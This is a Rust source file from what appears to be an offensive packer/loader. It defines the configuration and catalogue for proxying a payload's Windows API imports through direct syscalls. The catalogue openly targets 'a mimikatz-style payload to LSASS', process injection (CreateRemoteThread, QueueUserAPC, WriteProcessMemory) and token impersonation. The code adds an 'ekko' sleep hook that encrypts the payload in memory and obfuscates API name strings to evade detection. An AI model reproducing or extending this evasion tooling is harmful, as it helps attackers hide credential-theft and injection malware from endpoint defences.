//! API-resolution configuration and the proxy catalogue.
//!
//! `build.stub.api_resolution` (YAML) tells the loader to resolve the payload's
//! Windows API calls through a proxy generated in the stub instead of letting the
//! payload reach the real export. It is a *loader* concern, like
//! `build.stub.syscalls`, not a pipeline technique: it changes how the loader
//! resolves the payload's imports before running it.
//!
//! This module owns the **catalogue**: the closed, code-defined list of APIs an
//! operator may select. Adding an entry is a deliberate code change, because each
//! entry needs an implementation (how its proxy forwards or routes the call),
//! which is why the selection is validated against the catalogue instead of being
//! accepted as free-form text.
//!
//! `mode: proxy` rewrites the payload's IAT so catalogue hits land on the
//! generated proxies; every other import is forwarded, or refused when
//! `unmatched: abort`. The catalogue docs, phases and limitations live in
//! `docs/design/api-resolution.md`.

use serde::{Deserialize, Serialize};

use super::syscalls;
use crate::engine::obfuscation::StringsConfig;
use crate::error::{PackerError, Result};

mod templates;

use templates::*;

/// Raw `build.stub.api_resolution` YAML block, before semantic validation.
///
/// `mode` and `unmatched` are plain strings here so
/// [`ApiResolutionConfig::from_yaml`] can report clear errors for invalid values
/// instead of a generic deserialization message, matching `YamlSyscallsPlan`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct YamlApiResolutionPlan {
    /// Proxy mode (`none` or `proxy`).
    #[serde(default = "default_mode")]
    pub mode: String,

    /// Catalogue selections, written as `dll!function` (e.g.
    /// `kernel32!ReadProcessMemory`), a list of them, or `all` to proxy every
    /// catalogue entry. The module side is normalized on lookup.
    #[serde(
        default,
        skip_serializing_if = "Vec::is_empty",
        deserialize_with = "deserialize_apis"
    )]
    pub apis: Vec<String>,

    /// What to do with imports not in the catalogue (`forward` or `abort`).
    #[serde(default = "default_unmatched")]
    pub unmatched: String,

    /// Per-API behavior for intercepted calls that is not a plain route.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub hooks: Option<YamlHooks>,
}

/// `build.stub.api_resolution.hooks`: interception behavior that needs its own
/// parameters (the IAT seam is the same; the action is not a route).
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, Default)]
#[serde(deny_unknown_fields)]
pub struct YamlHooks {
    /// Obfuscate the payload's mapped image while it sleeps.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub sleep: Option<YamlSleepHook>,
}

/// `hooks.sleep`: the `Sleep` proxy runs ekko over the mapped payload.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct YamlSleepHook {
    /// Obfuscation variant. Only `ekko` is implemented.
    #[serde(default = "default_obfuscate")]
    pub obfuscate: String,

    /// Sleeps shorter than this are a plain delay: a payload that yields with
    /// `Sleep(0)` or polls with short sleeps must not pay the ROP chain.
    #[serde(default = "default_min_ms")]
    pub min_ms: u64,

    /// Sleeps longer than this are a plain delay: the image stays encrypted
    /// only for a bounded window.
    #[serde(default = "default_max_ms")]
    pub max_ms: u64,

    /// Acknowledges that the payload does not execute from the mapped image on
    /// another thread while it sleeps. Ekko cannot encrypt a region that is
    /// still running; a multi-threaded payload would crash.
    #[serde(default)]
    pub assume_single_threaded: bool,
}

fn default_obfuscate() -> String {
    "ekko".to_string()
}

fn default_min_ms() -> u64 {
    1000
}

fn default_max_ms() -> u64 {
    600_000
}

fn default_mode() -> String {
    "none".to_string()
}

fn default_unmatched() -> String {
    "forward".to_string()
}

/// Deserializes `apis` from a bare string (`apis: all`) or a list of strings.
fn deserialize_apis<'de, D>(deserializer: D) -> std::result::Result<Vec<String>, D::Error>
where
    D: serde::Deserializer<'de>,
{
    struct ApisVisitor;

    impl<'de> serde::de::Visitor<'de> for ApisVisitor {
        type Value = Vec<String>;

        fn expecting(&self, formatter: &mut core::fmt::Formatter) -> core::fmt::Result {
            formatter.write_str("a selector string or a list of selector strings")
        }

        fn visit_str<E>(self, value: &str) -> std::result::Result<Self::Value, E>
        where
            E: serde::de::Error,
        {
            Ok(vec![value.to_string()])
        }

        fn visit_seq<A>(self, seq: A) -> std::result::Result<Self::Value, A::Error>
        where
            A: serde::de::SeqAccess<'de>,
        {
            Vec::<String>::deserialize(serde::de::value::SeqAccessDeserializer::new(seq))
        }
    }

    deserializer.deserialize_any(ApisVisitor)
}

/// Whether the loader proxies the payload's API resolution at all.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ApiResolutionMode {
    /// The loader resolves imports as before; the block is a no-op.
    None,
    /// Catalogue hits are served by a proxy generated in the stub.
    Proxy,
}

/// What the loader does with an import that is *not* in the catalogue.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Unmatched {
    /// Resolve it normally (no proxy).
    Forward,
    /// Abort the load.
    Abort,
}

/// What a generated proxy does with an intercepted call.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Strategy {
    /// Call the original function (resolved dynamically, never imported).
    ///
    /// No shipped catalogue entry uses it today (see
    /// `docs/design/api-resolution.md`): it stays available for "thick" APIs
    /// that cannot be re-implemented on a syscall.
    #[allow(dead_code)]
    Forward,
    /// Re-implement the call on the native `Nt*` function via the syscall layer.
    RouteToNt,
    /// A handler that decides what to return (the `GetProcAddress` case).
    Handler,
}

/// One selectable API in the catalogue.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct ApiEntry {
    /// Normalized module base name: lowercase, no `.dll` (e.g. `kernel32`).
    pub dll: &'static str,
    /// Export name (case-sensitive).
    pub func: &'static str,
    /// What the generated proxy does.
    pub strategy: Strategy,
    /// The `Nt*` function the proxy routes to (`RouteToNt` only).
    pub nt: Option<&'static str>,
}

impl ApiEntry {
    /// The `dll!func` selector used in the YAML.
    pub fn selector(&self) -> String {
        let (dll, func) = (self.dll, self.func);
        format!("{dll}!{func}")
    }
}

/// The catalogue of APIs an operator may select.
///
/// Minimal on purpose (see `docs/design/api-resolution.md`): the critical path of
/// a mimikatz-style payload to LSASS. `NtReadVirtualMemory` already exists in the
/// syscall layer; `NtOpenProcess` is added alongside it.
pub const CATALOGUE: &[ApiEntry] = &[
    ApiEntry {
        dll: "ntdll",
        func: "NtReadVirtualMemory",
        strategy: Strategy::RouteToNt,
        nt: Some("NtReadVirtualMemory"),
    },
    ApiEntry {
        dll: "ntdll",
        func: "NtOpenProcess",
        strategy: Strategy::RouteToNt,
        nt: Some("NtOpenProcess"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "ReadProcessMemory",
        strategy: Strategy::RouteToNt,
        nt: Some("NtReadVirtualMemory"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "OpenProcess",
        strategy: Strategy::RouteToNt,
        nt: Some("NtOpenProcess"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "GetProcAddress",
        strategy: Strategy::Handler,
        nt: None,
    },
    // Cross-process injection: the Win32 wrappers re-implemented on the native
    // calls the syscall layer already carries.
    ApiEntry {
        dll: "kernel32",
        func: "VirtualAllocEx",
        strategy: Strategy::RouteToNt,
        nt: Some("NtAllocateVirtualMemory"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "WriteProcessMemory",
        strategy: Strategy::RouteToNt,
        nt: Some("NtWriteVirtualMemory"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "VirtualProtectEx",
        strategy: Strategy::RouteToNt,
        nt: Some("NtProtectVirtualMemory"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "CreateRemoteThread",
        strategy: Strategy::RouteToNt,
        nt: Some("NtCreateThreadEx"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "QueueUserAPC",
        strategy: Strategy::RouteToNt,
        nt: Some("NtQueueApcThread"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "ResumeThread",
        strategy: Strategy::RouteToNt,
        nt: Some("NtResumeThread"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "SuspendThread",
        strategy: Strategy::RouteToNt,
        nt: Some("NtSuspendThread"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "GetThreadContext",
        strategy: Strategy::RouteToNt,
        nt: Some("NtGetContextThread"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "SetThreadContext",
        strategy: Strategy::RouteToNt,
        nt: Some("NtSetContextThread"),
    },
    // Token manipulation. `LogonUser` is deliberately absent: it is a
    // LSA/ALPC interaction with no single Nt* equivalent.
    ApiEntry {
        dll: "advapi32",
        func: "OpenProcessToken",
        strategy: Strategy::RouteToNt,
        nt: Some("NtOpenProcessToken"),
    },
    ApiEntry {
        dll: "advapi32",
        func: "DuplicateTokenEx",
        strategy: Strategy::RouteToNt,
        nt: Some("NtDuplicateToken"),
    },
    ApiEntry {
        dll: "advapi32",
        func: "ImpersonateLoggedOnUser",
        strategy: Strategy::RouteToNt,
        nt: Some("NtSetInformationThread"),
    },
    // Process-memory primitives. These are `Handler` entries: the Win32
    // signatures take the current process implicitly, so the wrapper rebuilds
    // the call on the native helper instead of forwarding it.
    ApiEntry {
        dll: "kernel32",
        func: "VirtualAlloc",
        strategy: Strategy::Handler,
        nt: Some("NtAllocateVirtualMemory"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "VirtualProtect",
        strategy: Strategy::Handler,
        nt: Some("NtProtectVirtualMemory"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "VirtualFree",
        strategy: Strategy::Handler,
        nt: Some("NtFreeVirtualMemory"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "CloseHandle",
        strategy: Strategy::Handler,
        nt: Some("NtClose"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "WaitForSingleObject",
        strategy: Strategy::Handler,
        nt: Some("NtWaitForSingleObject"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "VirtualQuery",
        strategy: Strategy::Handler,
        nt: Some("NtQueryVirtualMemory"),
    },
    ApiEntry {
        dll: "kernel32",
        func: "CreateThread",
        strategy: Strategy::Handler,
        nt: Some("NtCreateThreadEx"),
    },
    ApiEntry {
        dll: "advapi32",
        func: "OpenThreadToken",
        strategy: Strategy::Handler,
        nt: Some("NtOpenThreadToken"),
    },
];

/// Additional `Nt*` helpers a handler calls beyond [`ApiEntry::nt`].
///
/// Kept as a table so the catalogue literals stay one-helper-per-entry: the
/// `CreateThread` wrapper also queries `ThreadBasicInformation` to fill
/// `lpThreadId`, which the native create call does not return.
const EXTRA_SYSCALLS: &[(&str, &str, &str)] =
    &[("kernel32", "CreateThread", "NtQueryInformationThread")];

/// Resolved `build.stub.api_resolution` configuration.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ApiResolutionConfig {
    /// Whether the loader proxies API resolution at all.
    pub mode: ApiResolutionMode,
    /// Selected entries, in first-seen order and deduplicated.
    pub apis: Vec<ApiEntry>,
    /// What to do with imports not in the catalogue.
    pub unmatched: Unmatched,
    /// Interception behavior that is not a plain route.
    pub hooks: HooksConfig,
}

/// Resolved `hooks:` block.
#[derive(Debug, Clone, PartialEq, Eq, Default)]
pub struct HooksConfig {
    /// Obfuscate the payload while it sleeps, or `None`.
    pub sleep: Option<SleepHookConfig>,
}

/// Resolved `hooks.sleep`.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct SleepHookConfig {
    /// Shortest sleep that is obfuscated, in milliseconds.
    pub min_ms: u32,
    /// Longest sleep that is obfuscated, in milliseconds.
    pub max_ms: u32,
}

impl HooksConfig {
    /// Resolves and validates the hook block.
    ///
    /// `assume_single_threaded` is a hard requirement in this phase: the chain
    /// encrypts the mapped image, so a payload thread executing from it would
    /// fault. The field forces the operator to acknowledge that constraint
    /// instead of discovering it in the lab.
    fn from_yaml(yaml: &YamlHooks) -> Result<Self> {
        let sleep = match &yaml.sleep {
            Some(sleep) => {
                if sleep.obfuscate != "ekko" {
                    return Err(PackerError::Validation(format!(
                        "invalid build.stub.api_resolution.hooks.sleep.obfuscate '{}': expected \
                         'ekko' (foliage and cronos are not implemented)",
                        sleep.obfuscate
                    )));
                }
                if sleep.min_ms > sleep.max_ms {
                    return Err(PackerError::Validation(format!(
                        "build.stub.api_resolution.hooks.sleep.min_ms ({}) is greater than max_ms \
                         ({})",
                        sleep.min_ms, sleep.max_ms
                    )));
                }
                if sleep.max_ms > u32::MAX as u64 {
                    return Err(PackerError::Validation(format!(
                        "build.stub.api_resolution.hooks.sleep.max_ms ({}) exceeds the maximum of \
                         {}",
                        sleep.max_ms,
                        u32::MAX
                    )));
                }
                if !sleep.assume_single_threaded {
                    return Err(PackerError::Validation(
                        "build.stub.api_resolution.hooks.sleep encrypts the mapped payload image \
                         while it sleeps, so no other payload thread may execute from it: set \
                         'assume_single_threaded: true' to acknowledge that constraint"
                            .to_string(),
                    ));
                }
                Some(SleepHookConfig {
                    min_ms: sleep.min_ms as u32,
                    max_ms: sleep.max_ms as u32,
                })
            }
            None => None,
        };
        Ok(Self { sleep })
    }
}

impl Default for ApiResolutionConfig {
    fn default() -> Self {
        Self {
            mode: ApiResolutionMode::None,
            apis: Vec::new(),
            unmatched: Unmatched::Forward,
            hooks: HooksConfig::default(),
        }
    }
}

impl ApiResolutionConfig {
    /// Resolves the configuration from the (optional) YAML block.
    ///
    /// `None` means the defaults (`mode: none`, `unmatched: forward`, no APIs).
    /// An unknown mode/unmatched value, a malformed selector, or a name that is
    /// not in the catalogue is a validation error with a clear message.
    pub fn from_yaml(yaml: Option<&YamlApiResolutionPlan>) -> Result<Self> {
        let Some(yaml) = yaml else {
            return Ok(Self::default());
        };

        let mode = match yaml.mode.as_str() {
            "none" => ApiResolutionMode::None,
            "proxy" => ApiResolutionMode::Proxy,
            other => {
                return Err(PackerError::Validation(format!(
                    "invalid build.stub.api_resolution.mode '{other}': expected 'none' or 'proxy'"
                )));
            }
        };

        let unmatched = match yaml.unmatched.as_str() {
            "forward" => Unmatched::Forward,
            "abort" => Unmatched::Abort,
            other => {
                return Err(PackerError::Validation(format!(
                    "invalid build.stub.api_resolution.unmatched '{other}': expected 'forward' or \
                     'abort'"
                )));
            }
        };

        // Every selectable entry: the catalogue plus a direct `ntdll!Nt*` route
        // for each syscall-layer function whose helper can back a faithful proxy.
        let direct = direct_entries();
        let selectable: Vec<ApiEntry> = {
            let mut all: Vec<ApiEntry> = CATALOGUE.to_vec();
            for entry in &direct {
                if !all.contains(entry) {
                    all.push(*entry);
                }
            }
            all
        };

        // `all` proxies every selectable entry; `ntdll:*` the direct routes;
        // otherwise each `dll!function` selector is looked up (an unknown name is
        // a validation error).
        let mut apis: Vec<ApiEntry> = Vec::new();
        if yaml
            .apis
            .iter()
            .any(|selector| selector.eq_ignore_ascii_case("all"))
        {
            apis = selectable;
        } else {
            for selector in &yaml.apis {
                if selector.eq_ignore_ascii_case("ntdll:*") {
                    for entry in &direct {
                        push_unique(&mut apis, *entry);
                    }
                } else {
                    let entry =
                        lookup(selector, &selectable).ok_or_else(|| unknown_api(selector))?;
                    push_unique(&mut apis, entry);
                }
            }
        }

        let config = Self {
            mode,
            apis,
            unmatched,
            hooks: match &yaml.hooks {
                Some(hooks) => HooksConfig::from_yaml(hooks)?,
                None => HooksConfig::default(),
            },
        };
        if config.hooks.sleep.is_some() && config.mode != ApiResolutionMode::Proxy {
            return Err(PackerError::Validation(
                "build.stub.api_resolution.hooks requires 'mode: proxy': a hook replaces the \
                 payload's import slot with a generated proxy"
                    .to_string(),
            ));
        }
        Ok(config)
    }

    /// Whether the configuration does nothing at build time.
    ///
    /// True when the mode is `none`, or when `proxy` declares neither an API to
    /// intercept nor a hook.
    pub fn is_noop(&self) -> bool {
        self.mode == ApiResolutionMode::None || (self.apis.is_empty() && self.hooks.sleep.is_none())
    }
}

/// The direct `ntdll!Nt*` routes a generated proxy can serve.
fn direct_entries() -> Vec<ApiEntry> {
    syscalls::nt_proxy_names()
        .into_iter()
        .map(|name| ApiEntry {
            dll: "ntdll",
            func: name,
            strategy: Strategy::RouteToNt,
            nt: Some(name),
        })
        .collect()
}

/// Pushes `entry` unless an equal one is already present.
fn push_unique(apis: &mut Vec<ApiEntry>, entry: ApiEntry) {
    if !apis.contains(&entry) {
        apis.push(entry);
    }
}

/// Looks up a `dll!func` selector (module side normalized) among `selectable`.
fn lookup(selector: &str, selectable: &[ApiEntry]) -> Option<ApiEntry> {
    let (dll, func) = selector.split_once('!')?;
    let dll = normalize_module(dll);
    selectable
        .iter()
        .find(|entry| entry.dll == dll.as_str() && entry.func == func)
        .copied()
}

/// Normalizes a module name for comparison: file-name component only, a trailing
/// `.dll` stripped (case-insensitively), ASCII-lowercased.
///
/// The resolver and the generated `GetProcAddress` handler normalize both sides
/// the same way, so `kernel32`, `KERNEL32.DLL` and a full path all match.
fn normalize_module(name: &str) -> String {
    let base = name.rsplit(['\\', '/']).next().unwrap_or(name);
    let lower = base.to_ascii_lowercase();
    lower.strip_suffix(".dll").unwrap_or(&lower).to_string()
}

/// The error for a selector that is not in the catalogue.
fn unknown_api(selector: &str) -> PackerError {
    let known = CATALOGUE
        .iter()
        .map(ApiEntry::selector)
        .collect::<Vec<_>>()
        .join(", ");
    PackerError::Validation(format!(
        "unknown build.stub.api_resolution.apis entry '{selector}': not in the catalogue ({known}); \
         use 'ntdll:*' for every direct Nt* route or 'all' for everything"
    ))
}

/// The `Nt*` functions the selected proxies route to.
impl ApiResolutionConfig {
    /// The `Nt*` helpers the syscall layer must provide for the selected
    /// entries, deduplicated and in the catalogue order.
    ///
    /// Both a direct route and a handler declare the helper it ends up calling:
    /// a `RouteToNt` entry forwards to it, and a `Handler` (the Win32 wrappers)
    /// calls it from its body.
    pub fn required_syscalls(&self) -> Vec<&'static str> {
        let mut out: Vec<&'static str> = Vec::new();
        for entry in &self.apis {
            if let Some(nt) = entry.nt {
                if !out.contains(&nt) {
                    out.push(nt);
                }
            }
            for (dll, func, extra) in EXTRA_SYSCALLS {
                if entry.dll == *dll && entry.func == *func && !out.contains(extra) {
                    out.push(extra);
                }
            }
        }
        // The `Sleep` hook degrades to a real delay on every path it does not
        // obfuscate, and that delay is `NtDelayExecution`.
        if self.hooks.sleep.is_some() && !out.contains(&"NtDelayExecution") {
            out.push("NtDelayExecution");
        }
        out
    }
}

/// Renders the `$API_RESOLUTION_BLOCK$` fragment for the given configuration.
///
/// Emits a no-op `resolution_policy` when nothing is proxied (the execution
/// fragment always calls it), or the selected proxies plus the policy that maps
/// each intercepted `(module, function)` to its proxy. Imports outside the
/// catalogue resolve normally, or fail the load when `unmatched: abort`. Every
/// API name is rebuilt at runtime from `strings`; the names appear only in
/// comments (stripped from the source-literal guard) and in `proxy_<index>`
/// identifiers.
pub fn render_block(config: &ApiResolutionConfig, strings: &StringsConfig) -> String {
    if config.mode != ApiResolutionMode::Proxy
        || (config.apis.is_empty() && config.hooks.sleep.is_none())
    {
        return NOOP_BLOCK.to_string();
    }

    let mut proxies = String::new();
    let mut matches = String::new();

    for (index, entry) in config.apis.iter().enumerate() {
        proxies.push_str(&proxy_body(index, entry, strings));
        proxies.push('\n');

        let module_def = strings
            .obfuscate(entry.dll)
            .render_stub_expr(&format!("intercept_{index}_module"));
        let function_def = strings
            .obfuscate(entry.func)
            .render_stub_expr(&format!("intercept_{index}_function"));
        matches.push_str(&format!(
            "        {{\n            let want_module: String = {module_def};\n            let want_function: String = \
             {function_def};\n            if module == want_module.as_str() && func == \
             want_function.as_str() {{\n                return crate::ImportPolicy::Proxy(proxy_{index} as usize as u64);\n            }}\n        \
             }}\n"
        ));
    }

    // A hook matches by function name only. API-set imports (`Sleep` commonly
    // arrives through `api-ms-win-core-synch-*`) name a virtual module, so a
    // module comparison would miss them; `Sleep` is unambiguous enough.
    if let Some(sleep) = &config.hooks.sleep {
        let index = config.apis.len();
        proxies.push_str(&sleep_hook_proxy(index, sleep));
        proxies.push('\n');
        let function_def = strings
            .obfuscate("Sleep")
            .render_stub_expr("hook_sleep_function");
        matches.push_str(&format!(
            "        {{\n            let want_function: String = {function_def};\n            if func == \
             want_function.as_str() {{\n                return crate::ImportPolicy::Proxy(proxy_{index} as usize as u64);\n            }}\n        \
             }}\n"
        ));
    }

    let miss = match config.unmatched {
        Unmatched::Forward => "crate::ImportPolicy::Forward",
        Unmatched::Abort => "crate::ImportPolicy::Abort",
    };

    BLOCK_TEMPLATE
        .replace("$POLICY_MATCHES$", matches.trim_end())
        .replace("$MISS_DECISION$", miss)
        .replace("$PROXIES$", proxies.trim_end())
}

/// Index-based proxy id. The API name is kept only in comments so nothing but
/// obfuscated bytes carries it into the source or the binary.
fn proxy_id(index: usize) -> String {
    format!("proxy_{index}")
}

/// The `Sleep` hook body: conceals the mapped payload for the duration of the
/// sleep, and degrades to a real delay whenever it must not or cannot.
fn sleep_hook_proxy(index: usize, hook: &SleepHookConfig) -> String {
    let id = proxy_id(index);
    let comment = "hook for kernel32!Sleep: ekko over the mapped payload";
    SLEEP_HOOK
        .replace("$ID$", &id)
        .replace("$COMMENT$", comment)
        .replace("$MIN_MS$", &hook.min_ms.to_string())
        .replace("$MAX_MS$", &hook.max_ms.to_string())
}

/// The body of the proxy for one selected entry.
fn proxy_body(index: usize, entry: &ApiEntry, strings: &StringsConfig) -> String {
    // A direct `ntdll!Nt*` route is generated from the syscall layer's metadata.
    if entry.strategy == Strategy::RouteToNt {
        if let Some(info) = syscalls::nt_proxy_info(entry.func) {
            return direct_nt_proxy(index, entry, info);
        }
    }

    let id = proxy_id(index);
    let comment = format!("proxy for {}!{}", entry.dll, entry.func);
    match entry.func {
        "ReadProcessMemory" => WRAPPER_READ_PROCESS_MEMORY
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "OpenProcess" => REBUILD_OPEN_PROCESS
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "GetProcAddress" => handler_proxy(index, entry, strings),
        "VirtualAllocEx" => WRAPPER_VIRTUAL_ALLOC_EX
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "WriteProcessMemory" => WRAPPER_WRITE_PROCESS_MEMORY
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "VirtualProtectEx" => WRAPPER_VIRTUAL_PROTECT_EX
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "CreateRemoteThread" => REBUILD_CREATE_REMOTE_THREAD
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "QueueUserAPC" => WRAPPER_QUEUE_USER_APC
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "ResumeThread" => WRAPPER_RESUME_THREAD
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "SuspendThread" => WRAPPER_SUSPEND_THREAD
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "GetThreadContext" => WRAPPER_GET_THREAD_CONTEXT
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "SetThreadContext" => WRAPPER_SET_THREAD_CONTEXT
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "OpenProcessToken" => WRAPPER_OPEN_PROCESS_TOKEN
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "DuplicateTokenEx" => WRAPPER_DUPLICATE_TOKEN_EX
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "ImpersonateLoggedOnUser" => WRAPPER_IMPERSONATE_LOGGED_ON_USER
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "VirtualAlloc" => WRAPPER_VIRTUAL_ALLOC
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "VirtualProtect" => WRAPPER_VIRTUAL_PROTECT
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "VirtualFree" => WRAPPER_VIRTUAL_FREE
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "CloseHandle" => WRAPPER_CLOSE_HANDLE
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "WaitForSingleObject" => WRAPPER_WAIT_FOR_SINGLE_OBJECT
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "VirtualQuery" => WRAPPER_VIRTUAL_QUERY
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "CreateThread" => WRAPPER_CREATE_THREAD
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        "OpenThreadToken" => WRAPPER_OPEN_THREAD_TOKEN
            .replace("$ID$", &id)
            .replace("$COMMENT$", &comment),
        // Unreachable for the shipped catalogue; kept so an entry without a body
        // is visible in the generated source instead of referencing a missing
        // function.
        _ => format!("    // {comment}: no proxy body is implemented yet\n"),
    }
}

/// A generated direct `ntdll!Nt*` proxy: an `extern "system"` wrapper with the
/// export's native signature that forwards to the syscall-layer helper.
fn direct_nt_proxy(index: usize, entry: &ApiEntry, info: syscalls::NtProxyInfo) -> String {
    let id = proxy_id(index);
    let comment = format!("proxy for {}!{}", entry.dll, entry.func);
    let params = info
        .params
        .iter()
        .map(|(name, ty)| format!("{name}: {ty}"))
        .collect::<Vec<_>>()
        .join(", ");
    format!(
        "    /// {comment}: routed through the syscall layer.\n    \
         extern \"system\" fn {id}({params}) -> i32 {{\n        \
         crate::{helper}({forward})\n    }}\n",
        helper = info.helper_name,
        forward = info.forward,
    )
}

/// A `GetProcAddress` handler: catalogue hits get their proxy, everything else
/// (including ordinals) is forwarded to the original resolver.
fn handler_proxy(index: usize, entry: &ApiEntry, strings: &StringsConfig) -> String {
    let id = proxy_id(index);
    let comment = format!("handler for {}!{}", entry.dll, entry.func);
    let dll_def = strings
        .obfuscate(&format!("{}.dll", entry.dll))
        .render_stub_expr(&format!("original_{index}_dll"));
    let func_def = strings
        .obfuscate(entry.func)
        .render_stub_expr(&format!("original_{index}_func"));
    HANDLER_TEMPLATE
        .replace("$PROXY$", &id)
        .replace("$ORIGINAL$", &format!("original_{index}"))
        .replace("$COMMENT$", &comment)
        .replace("$DLL_DEF$", &dll_def)
        .replace("$FUNC_DEF$", &func_def)
}

/// A forwarding proxy: calls the original export, resolved at runtime.
#[allow(dead_code)]
fn forward_proxy(
    index: usize,
    entry: &ApiEntry,
    strings: &StringsConfig,
    params: &str,
    types: &str,
    ret: &str,
    args: &str,
) -> String {
    let id = proxy_id(index);
    let comment = format!("proxy for {}!{}", entry.dll, entry.func);
    let dll_def = strings
        .obfuscate(&format!("{}.dll", entry.dll))
        .render_stub_expr(&format!("original_{index}_dll"));
    let func_def = strings
        .obfuscate(entry.func)
        .render_stub_expr(&format!("original_{index}_func"));
    FORWARD_TEMPLATE
        .replace("$PROXY$", &id)
        .replace("$ORIGINAL$", &format!("original_{index}"))
        .replace("$COMMENT$", &comment)
        .replace("$PARAMS$", params)
        .replace("$TYPES$", types)
        .replace("$RET$", ret)
        .replace("$ARGS$", args)
        .replace("$DLL_DEF$", &dll_def)
        .replace("$FUNC_DEF$", &func_def)
}

#[cfg(test)]
mod tests;
